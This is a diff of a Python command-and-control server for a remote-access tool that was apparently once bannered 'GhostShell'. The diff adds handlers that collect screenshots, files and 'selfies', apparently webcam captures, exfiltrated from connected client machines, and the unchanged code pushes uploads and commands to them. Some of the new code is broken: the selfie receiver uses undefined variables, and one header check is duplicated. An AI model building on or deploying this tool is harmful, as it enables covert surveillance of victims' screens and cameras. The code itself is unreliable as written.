@@ -3,18 +3,7 @@ import threading
 import os
 import time
 
-banner = """
- ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
-██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
-██║  ███╗███████║██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
-██║   ██║██╔══██║██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
-╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
- ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 
-            GhostShell v1.0
-"""
-
-print(banner)
 
 HOST = '0.0.0.0'
 PORT = 5000
@@ -27,22 +16,139 @@ clients = []
 
 print("Server waiting for connection...")
 
+def receive_screenshot(conn, filename, filesize):
 
-# 🔥 receive thread
+    with open(filename, "wb") as f:
+
+        received = 0
+
+        while received < filesize:
+
+            chunk = conn.recv(min(1024, filesize - received))
+
+            if not chunk:
+                break
+
+            f.write(chunk)
+
+            received += len(chunk)
+
+    print(f"[+] Screenshot saved as {filename}")
+
+
+
 def receive_thread(conn, addr):
     while True:
         try:
             data = conn.recv(1024).decode()
-            if data:
-                print(f"\nClient [{addr[0]}]: {data}")
+
+            if not data:
+                continue
+
+            # SCREENSHOT HEADER detect
+            if data.startswith("SCREEN "):
+
+                parts = data.split()
+
+                filename = parts[1]
+
+                filesize = int(parts[2])
+
+                print(f"\nReceiving screenshot: {filename}")
+
+                receive_screenshot(conn, filename, filesize)
+
+                continue
+
+            # FILE HEADER detect
+            if data.startswith("FILE "):
+
+                parts = data.split()
+
+                filename = parts[1]
+
+                filesize = int(parts[2])
+
+                receive_screenshot(conn, filename, filesize)
+
+                continue
+
+            print(f"\nClient [{addr[0]}]: {data}")
+
         except:
             print(f"\nClient {addr[0]} disconnected!\n")
             conn.close()
+
             if (conn, addr) in clients:
                 clients.remove((conn, addr))
+
             break
 
+def receive_selfie(conn, imgname, imgsize):
 
+    with open(imgname, "wb") as f:
+
+        received = 0
+
+        while received < imgsize:
+
+            chunk = conn.recv(min(1024, filesize - received))
+
+            if not chunk:
+                break
+
+            f.write(chunk)
+
+            received += len(chunk)
+
+    print(f"[+] Selfie saved as {filename}")
+
+def received_selfie(conn, addr):
+    while True:
+        try:
+            data = conn.recv(1024).decode()
+
+            if not data:
+                continue
+
+            # SCREENSHOT HEADER detect
+            if data.startswith("SELFIE "):
+
+                parts = data.split()
+
+                imgname = parts[1]
+
+                imgsize = int(parts[2])
+
+                print(f"\nReceiving selfie: {imgname}")
+
+                receive_selfie(conn, imgname, imgsize)
+
+                continue
+
+            # FILE HEADER detect
+            if data.startswith("SELFIE "):
+
+                parts = data.split()
+
+                imgname = parts[1]
+
+                imgsize = int(parts[2])
+
+                receive_selfie(conn, imgname, imgsize)
+
+                continue
+
+            print(f"\nClient [{addr[0]}]: {data}")
+
+        except:
+            print(f"\nClient {addr[0]} disconnected!\n")
+            conn.close()
+
+            if (conn, addr) in clients:
+                clients.remove((conn, addr))
+
+            break
 # 🔥 accept thread
 def accept_clients():
     while True:
@@ -104,9 +210,9 @@ while True:
             os.system("clear")
             continue
         
-        if msg.lower() == "banner":
-            print(banner)
-            continue
+        
+
+
         
         if msg.startswith("upload "):
             try:
@@ -138,7 +244,10 @@ while True:
             except Exception as e:
                 print("Error sending file:", e)
 
-        
+
+
+
+
 
 
         for conn, addr in selected:
